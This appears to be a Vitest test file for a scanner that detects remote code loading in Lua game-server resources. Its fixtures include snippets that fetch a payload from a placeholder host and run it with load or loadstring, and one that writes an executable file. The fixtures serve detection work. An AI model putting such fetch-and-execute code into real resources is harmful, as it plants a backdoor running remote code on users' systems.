import { describe, expect, it } from 'vitest';
import { analyzeExecution } from './execution.js';

describe('remote loading and dynamic execution', () => {
  it('links a fetch to the loader that follows it', () => {
    const source = [
      "PerformHttpRequest('https://fixture.invalid/payload.lua', function(status, body)",
      '    if status == 200 then',
      '        local chunk = load(body)',
      '        if chunk then chunk() end',
      '    end',
      'end)',
    ].join('\n');

    const analysis = analyzeExecution(source);
    expect(analysis.remoteLoads).toHaveLength(1);
    expect(analysis.remoteLoads[0]?.fetchCall).toBe('PerformHttpRequest');
    expect(analysis.remoteLoads[0]?.url).toBe('https://fixture.invalid/payload.lua');
    expect(analysis.remoteLoads[0]?.loaders[0]?.call).toBe('load');
  });

  it('groups several loaders under one fetch rather than reporting each pair', () => {
    const source = [
      "PerformHttpRequest('https://fixture.invalid/a.lua', function(status, body)",
      '    load(body)',
      '    loadstring(body)',
      'end)',
    ].join('\n');
    const analysis = analyzeExecution(source);
    expect(analysis.remoteLoads).toHaveLength(1);
    expect(analysis.remoteLoads[0]?.loaders).toHaveLength(2);
  });

  it('does not link a loader that runs before the fetch', () => {
    const source = ['load(cached)', '', "PerformHttpRequest('https://fixture.invalid/a.lua', function() end)"].join('\n');
    expect(analyzeExecution(source).remoteLoads).toEqual([]);
  });

  it('does not link a loader far below the fetch', () => {
    const source = [
      "PerformHttpRequest('https://fixture.invalid/a.lua', function() end)",
      ...Array.from({ length: 80 }, () => '-- filler'),
      'load(somethingElse)',
    ].join('\n');
    expect(analyzeExecution(source).remoteLoads).toEqual([]);
  });

  it('does not report a fetch that only handles data', () => {
    const source = [
      "PerformHttpRequest('https://fixture.invalid/version.json', function(status, body)",
      '    local data = json.decode(body)',
      '    print(data.version)',
      'end)',
    ].join('\n');
    expect(analyzeExecution(source).remoteLoads).toEqual([]);
  });

  it('distinguishes executing a literal from executing a value', () => {
    const literal = analyzeExecution("load('return 1')");
    const dynamic = analyzeExecution('load(payload)');
    expect(literal.dynamicExecutions[0]?.literalInput).toBe(true);
    expect(dynamic.dynamicExecutions[0]?.literalInput).toBe(false);
  });

  it('detects a write to an executable path', () => {
    const analysis = analyzeExecution("SaveResourceFile(GetCurrentResourceName(), 'helper.exe', data, -1)");
    expect(analysis.fileWrites[0]?.executableTarget).toBe(true);
  });

  it('does not flag an ordinary file write', () => {
    const analysis = analyzeExecution("SaveResourceFile(GetCurrentResourceName(), 'config.json', data, -1)");
    expect(analysis.fileWrites[0]?.executableTarget).toBe(false);
  });

  it('never throws on hostile input', () => {
    for (const content of ['', 'load(', '('.repeat(500)]) {
      expect(() => analyzeExecution(content)).not.toThrow();
    }
  });
});
